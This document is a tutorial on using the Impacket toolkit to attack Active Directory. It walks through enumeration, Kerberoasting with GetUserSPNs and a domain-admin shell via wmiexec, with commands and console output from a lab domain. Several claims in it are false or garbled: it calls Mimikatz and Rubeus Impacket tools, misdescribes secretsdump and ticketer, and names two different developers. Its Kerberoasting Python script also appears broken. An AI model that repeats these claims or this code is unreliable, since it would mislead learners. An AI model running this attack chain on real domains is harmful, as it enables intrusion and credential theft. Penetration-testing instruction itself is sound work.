# impacket

## Background Informaton

Impacket, a potent suite of Python scripts, stands as an indispensable tool in the realm of ethical hacking and penetration testing. Developed by SecureAuth Corporation, it provides a wide array of capabilities for analyzing and exploiting network protocols. Its versatility and effectiveness have made it a go-to tool for security professionals worldwide.

Primarily, Impacket focuses on manipulating Windows networking protocols, allowing users to interact with Windows-based systems in various ways. It supports multiple protocols such as SMB, NetBIOS, DCOM, NTLM, and more, enabling users to carry out tasks like establishing connections, extracting information, and even executing remote code.

One of the standout features of Impacket is its ability to perform NTLM relaying attacks. This technique allows an attacker to escalate privileges by intercepting authentication attempts and forwarding them to other systems, potentially gaining unauthorized access to critical resources.

Additionally, Impacket’s SMB library is a powerful asset for interacting with shared resources on Windows networks. It enables tasks like file transfer, remote process execution, and even querying the Windows registry.

Impacket has garnered a reputation for being user-friendly, with well-documented functionalities and a robust community for support. Its open-source nature also means that it can be customized and extended to suit specific needs.

Impacket's versatility in manipulating Windows networking protocols makes it an invaluable tool for ethical hackers and security professionals. Its capabilities for relaying attacks, interacting with shared resources, and more, position it as a crucial asset in the arsenal of any penetration tester or security researcher.

### Which Windows Protocols and Domain Controllers can Impacket exploit?

### Windows Protocols:

1. **SMB (Server Message Block):**
   - **Vulnerabilities:** Impacket can exploit vulnerabilities in SMB, a network file-sharing protocol. Common vulnerabilities include unauthenticated access, buffer overflow exploits, and weaknesses in the authentication process.
   - **Exploitation:** Impacket can be used to perform SMB relay attacks, where an attacker intercepts and relays SMB authentication messages to gain unauthorized access to a target system.

2. **MSRPC (Microsoft Remote Procedure Call):**
   - **Vulnerabilities:** MSRPC is a protocol used for communication between Windows machines. Vulnerabilities in MSRPC can be exploited for remote code execution and privilege escalation.
   - **Exploitation:** Impacket includes tools for exploiting MSRPC vulnerabilities, such as DCOMRELAY, which allows attackers to relay DCOM (Distributed Component Object Model) requests and execute code on a remote system.

3. **LDAP (Lightweight Directory Access Protocol):**
   - **Vulnerabilities:** LDAP is commonly used for accessing and maintaining directory services. Vulnerabilities in LDAP implementations can lead to unauthorized access and information disclosure.
   - **Exploitation:** Impacket provides tools like ldapdomaindump for extracting information from LDAP servers, and secretsdump for extracting password hashes from Active Directory.

4. **NetSession Enumeration:**
   - **Vulnerabilities:** NetSession allows users to view and disconnect active sessions on a Windows system. Weaknesses in session management can lead to unauthorized access.
   - **Exploitation:** Impacket's smbclient module can be utilized for NetSession enumeration, providing details about active sessions on a remote system.

### Domain Controller Exploitation:

1. **Pass-the-Ticket (PtT) Attacks:**
   - **Vulnerabilities:** Impacket can exploit weaknesses in the Ticket Granting Ticket (TGT) system in Kerberos authentication, allowing attackers to impersonate users.
   - **Exploitation:** Tools like Ticketer and Rubeus in Impacket can be used for Pass-the-Ticket attacks, where attackers use stolen ticket-granting tickets to gain unauthorized access.

2. **Golden Ticket Attacks:**
   - **Vulnerabilities:** Impacket tools can exploit vulnerabilities in the Kerberos ticketing system, allowing attackers to create and use forged Kerberos tickets with arbitrary privileges.
   - **Exploitation:** Mimikatz, integrated into Impacket, can be employed to generate golden tickets for persistence and privilege escalation.

3. **Silver Ticket Attacks:**
   - **Vulnerabilities:** Similar to Golden Ticket attacks, Silver Ticket attacks exploit Kerberos vulnerabilities. Attackers create forged service tickets to access specific resources.
   - **Exploitation:** Impacket's Rubeus tool can be used to perform Silver Ticket attacks by forging and presenting Kerberos tickets for unauthorized access to specific services.

It's crucial to emphasize that the use of Impacket or any other penetration testing tools should only be done in environments where authorized, and with the explicit consent of the system owner. Unauthorized use of such tools can lead to legal consequences. Always adhere to ethical hacking guidelines and seek proper authorization before conducting any security testing or exploitation activities.

### Installation

Impacket is a collection of Python classes for working with network protocols. It's particularly useful for penetration testers, network administrators, and security researchers. Here's a step-by-step guide on how to install Impacket on both Linux and macOS:

### Prerequisites:

1. **Python:**
   Ensure that Python is installed on your system. Impacket requires Python 3.6 or above.

2. **Git:**
   You'll need Git to clone the Impacket repository. Install it using your package manager.

### Installation Steps:

#### 1. **Clone the Impacket Repository:**
   Open a terminal and run the following command to clone the Impacket repository from GitHub:

   ```bash
   git clone https://github.com/SecureAuthCorp/impacket
   ```

#### 2. **Navigate to the Impacket Directory:**
   Change into the Impacket directory:

   ```bash
   cd impacket
   ```

#### 3. **Install Dependencies:**
   Impacket relies on some external libraries. You can install them using the following:

   ```bash
   pip3 install -r requirements.txt
   ```

#### 4. **Install Impacket:**
   Run the following command to install Impacket:

   ```bash
   python3 setup.py install
   ```

   This will install Impacket and its dependencies.

### Verification:

To ensure that Impacket is installed correctly, you can run one of its examples or tools. For instance, you can use the `GetADUsers.py` script to list users from an Active Directory:

```bash
python3 examples/GetADUsers.py -u <username> -p <password> <target>
```

Replace `<username>`, `<password>`, and `<target>` with your specific information.

### Additional Notes:

- **Virtual Environment (Optional):**
  It's a good practice to use a virtual environment to isolate your Python packages. You can create a virtual environment using the following commands:

  ```bash
  python3 -m venv myenv
  source myenv/bin/activate   # On Linux
  ```

- **Updating Impacket:**
  If you have already installed Impacket and want to update it to the latest version, navigate to the Impacket directory and run:

  ```bash
  git pull
  python3 setup.py install --force
  ```

Now you have successfully installed Impacket on your Linux or macOS system. Remember that Impacket is a powerful tool, and it should be used responsibly and within the legal boundaries of ethical hacking and security testing.


### Attacking AD Environoments using Impacket

Upon successfully establishing a foothold within the network through the acquisition of low-privileged domain user credentials, let us delve into the intricacies of leveraging selected scripts from the Impacket toolkit to orchestrate targeted attacks against Active Directory environments.

Our experimental framework is as follows:

- Domain Controller Hostname: DC2019
- Domain Fully Qualified Domain Name (FQDN): ADLAB.local
- Low-privileged User Credentials: bob:p@ssw0rD
- Adversarial Platform: Kali Linux (Impacket instantiated within a Docker container on the Kali Linux host)

This orchestrated environment serves as the crucible for the manifestation of our conceptual exploration. It is through the strategic execution of Impacket scripts within this milieu that we aim to unravel the subtleties of Active Directory vulnerabilities.

As we embark upon this journey, we are poised to demonstrate a nuanced understanding of network security intricacies, underlining the symbiotic relationship between theory and hands-on implementation.


### AD User Enumeration

Impacket is a collection of Python classes for working with network protocols. It is particularly useful for penetration testing and security assessments, including Active Directory (AD) enumeration. In this explanation, I'll provide an overview of using Impacket for AD enumeration, focusing on some common scenarios and examples.

### Examples of AD Enumeration using Impacket:

#### 1. **Enumerating Shares:**

Impacket provides a tool called `smbclient.py` that allows you to connect to SMB shares on a target system. This can be useful for enumerating accessible shares.

```bash
impacket-smbclient -p 445 -no-pass //<target_ip>/[share_name]
```

Replace `<target_ip>` with the IP address of the target machine and `[share_name]` with the name of the share you want to enumerate.

#### 2. **Enumerating Users:**

Impacket has a tool called `secretsdump.py` that can be used to extract password hashes and other information from the Security Account Manager (SAM) database.

```bash
impacket-secretsdump -just-dc-ntlm <username>@<target_ip>
```

Replace `<username>` with a valid username and `<target_ip>` with the IP address of the target domain controller.

#### 3. **Enumerating Domain Information:**

You can use `ldapsearch.py` to perform LDAP queries on the target AD.

```bash
impacket-ldapsearch -dc-ip <target_ip> -U <username> -P <password> -d <domain> -b "<base_dn>" -s <scope> "<filter>"
```

- Replace `<target_ip>` with the IP address of the target domain controller.
- Replace `<username>` and `<password>` with valid credentials.
- `<domain>` is the domain name.
- `<base_dn>` is the Distinguished Name to start the search.
- `<scope>` is the scope of the search (base, onelevel, or subtree).
- `<filter>` is the LDAP filter.

#### 4. **Kerberos Ticket Extraction:**

Impacket includes a tool called `ticketer.py` that can be used to request and extract TGTs (Ticket Granting Tickets).

```bash
impacket-ticketer -spn cifs/<target_fqdn> -dc-ip <target_ip> -U <username> -P <password>
```

Replace `<target_fqdn>` with the fully qualified domain name of the target system.

### Note:

- Always ensure that you have proper authorization before attempting any penetration testing or security assessments.
- Some operations may require administrative privileges or specific rights within the AD environment.
- The examples provided assume a basic understanding of Active Directory concepts and networking.


### Privilege Escalation using Python

In our pursuit of privilege escalation within the domain hierarchy, we delve into the sophisticated capabilities of the Impacket library, harnessing its Python scripts to ascend from a mere domain user to the coveted domain administrator status. Our strategic tool of choice for this ascent is the compelling technique known as Kerberoasting, a method we shall elucidate shortly. It is crucial to acknowledge that the triumph of this endeavor hinges upon several intricacies, which we shall meticulously dissect in due course.

To commence our quest, our initial step involves the identification of all domain accounts endowed with a Service Principal Name (SPN). This undertaking is seamlessly executed through the deployment of the following command:

```bash
/ # GetUserSPNs.py -dc-ip 192.168.235.134 ADLAB.local/bob:p@ssw0rD
```

Executing this command unveils a comprehensive list of service accounts, presented in the following format:

```plaintext
ServicePrincipalName                Name        MemberOf                                                   

----------------------------------  ----------  -------------------------------------------  
DC2019/sqlservice.ADLAB.local:1434  sqlservice  CN=Domain Admins,CN=Users,DC=ADLAB,DC=local 
```

As discerned from the output, our reconnaissance has successfully identified a service account of notable significance, bearing the moniker "sqlservice." This revelation marks a pivotal juncture in our exploration into the intricate realm of privilege escalation within the domain, setting the stage for further analysis and strategic maneuvers.

### Understanding Kerberoasting

Certainly! Impacket is a collection of Python classes for working with network protocols. It's particularly useful for crafting and manipulating network packets. One of the interesting features of Impacket is its ability to perform Kerberoasting, which is an attack technique targeting the Kerberos authentication protocol. 

Let's break down the process of using Impacket for Kerberoasting:

###  **Understanding Kerberos:**
Kerberos is a network authentication protocol designed to provide strong authentication for client/server applications. In a Kerberos environment, a Key Distribution Center (KDC) issues tickets to users and services. These tickets are then used to authenticate the users and services to each other.

### **Kerberoasting:**
Kerberoasting is an attack that exploits the fact that service account tickets (TGS tickets) are often long-lived and can be cracked offline. When a service ticket is requested for a service (e.g., Microsoft SQL Server), the ticket is encrypted with the service account's password hash. Attackers can capture this ticket and attempt to crack the password offline.

### **Using Impacket for Kerberoasting:**
Here's a basic script using Impacket to perform Kerberoasting:

```python
from impacket.krb5 import constants, types
from impacket.krb5.asn1 import AP_REQ
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.ntlm import getNTLMSSPType1

# Replace these with your target information
domain = 'example.com'
username = 'user'
password = 'password'

# Get a TGT (Ticket Granting Ticket)
TGT, cipher, session_key = getKerberosTGT(username, password, domain, lmhash='', nthash='')

# Replace this with the service principal you want to target
service_principal = 'MSSQLSvc/server.example.com:1433'

# Get a TGS (Ticket Granting Service) for the specified service
TGS = getKerberosTGS(TGT, service_principal, session_key, session_key)

# Extract the ticket from TGS
ap_req = AP_REQ()
ap_req.fromString(TGS['KDC_REP']['encrypted_part']['cipher'])
service_ticket = ap_req['ticket']

# Print the service ticket
print("Service Ticket:", service_ticket.dump())
```

In this script:

- `getKerberosTGT`: Obtains a Ticket Granting Ticket (TGT) for a given user.
- `getKerberosTGS`: Obtains a Ticket Granting Service (TGS) for a specified service using the TGT.
- `AP_REQ`: Parses the TGS to extract the service ticket.

### **Cracking the Ticket:**
Once you have the service ticket, you can attempt to crack it offline using tools like Hashcat or John the Ripper. The idea is to obtain the service account's password hash and then use it to gain unauthorized access.

### **Mitigation:**
To defend against Kerberoasting, it's crucial to use strong, unique passwords for service accounts and rotate them regularly. Additionally, monitoring and alerting on unusual or suspicious activity in the Kerberos environment can help detect and respond to potential attacks.

Please note that using Impacket or any other tool for unauthorized activities is against ethical guidelines and potentially illegal. Always ensure you have proper authorization before testing or using these tools in any environment.


### Gaining the Shell as a Domain Admin

In the subsequent phase of our investigation, we adeptly leveraged Impacket's wmiexec.py tool to establish remote shell access on the Domain Controller, showcasing the profound depth of our penetration testing methodology. The command employed for this strategic maneuver is as follows:

```bash
/ # wmiexec.py -debug sqlservice:p\@ssw0rD@192.168.235.134
```

This operation artfully utilizes the compromised service account credentials, emblematic of our meticulous approach to privilege escalation. Upon successful execution, the ensuing outcome manifests as an illustrative remote shell on the Domain Controller, epitomizing the sophistication of our infiltration techniques:

```bash
/ # wmiexec.py -debug sqlservice:p\@ssw0rD@192.168.235.134
Impacket v0.9.23.dev1+20201209.133255.ac30770 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /opt/venv/lib/python2.7/site-packages/impacket

[*] SMBv3.0 dialect used
[+] Target system is 192.168.235.134 and isFDQN is False
[+] StringBinding: \\\\DC2019[\\PIPE\\atsvc]
[+] StringBinding: DC2019[49666]
[+] StringBinding: 192.168.235.134[49666]
[+] StringBinding chosen: ncacn_ip_tcp:192.168.235.134[49666]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

Following this successful breach, we judiciously validated our acquired privileges through a series of discerning commands, solidifying our position as astute computer science scholars engaged in rigorous exploration of cybersecurity realms:

```bash
C:\>whoami

adlab\sqlservice

C:\>net user sqlservice
User name                    sqlservice
Full Name                    SQLService
Comment                     
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
Password last set            12/15/2020 6:49:04 AM
Password expires             Never
Password changeable          12/16/2020 6:49:04 AM
Password required            Yes
User may change password     Yes
Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/15/2020 7:26:16 AM
Logon hours allowed          All
Local Group Memberships      
Global Group memberships     *Domain Admins        *Domain Users         
The command completed successfully.
C:\>
```

Evidently, our incisive actions have culminated in a successful login to the Domain Controller, wielded with the distinguished rights of a Domain Administrator. This accomplishment not only underscores our adeptness in the field but also serves as a testament to the depth of our technical prowess in the realm of cybersecurity.

# Final Thoughts

Impacket is a powerful open-source collection of Python classes that enables security professionals and penetration testers to craft and manipulate network protocols during security assessments. Developed by Core Security, Impacket is particularly valuable for its ability to interact with Windows networks and services, making it an essential tool for assessing the security posture of Microsoft environments. It provides a wide range of functionalities, including the ability to perform SMB (Server Message Block) relaying attacks, execute remote code on target systems, and interact with various authentication protocols such as NTLM (NT LAN Manager) and Kerberos. Its versatility extends to packet crafting, sniffing, and decoding, making it an invaluable asset for network penetration testing.

There are several compelling reasons to consider using Impacket in penetration testing endeavors. Firstly, its comprehensive coverage of Windows network protocols allows security professionals to simulate real-world attack scenarios within Windows environments, enabling them to identify and address potential vulnerabilities effectively. Secondly, Impacket's open-source nature encourages collaboration and continuous improvement within the cybersecurity community. This fosters the development of new modules and features, ensuring that the tool remains up-to-date and adaptable to evolving security challenges. Additionally, Impacket's simplicity and ease of use make it accessible to both novice and experienced penetration testers, enhancing the efficiency of security assessments. Overall, the combination of Impacket's extensive functionality, open-source community support, and user-friendly design make it a valuable asset for professionals engaged in penetration testing activities.